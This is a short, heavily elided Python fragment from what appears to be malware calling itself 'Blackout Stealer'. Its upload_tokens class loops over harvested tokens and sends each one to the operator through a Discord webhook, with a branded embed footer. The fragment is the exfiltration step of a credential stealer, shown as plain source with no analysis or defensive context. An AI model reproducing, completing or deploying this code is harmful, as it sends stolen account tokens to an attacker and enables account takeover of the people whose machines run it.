...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="Blackout Stealer")

            self.webhook.send(embed=embed, username="Blackout", avatar_url="https://cdn.discordapp.com/attachments/1042782352381837343/1044236563384639498/image.png")
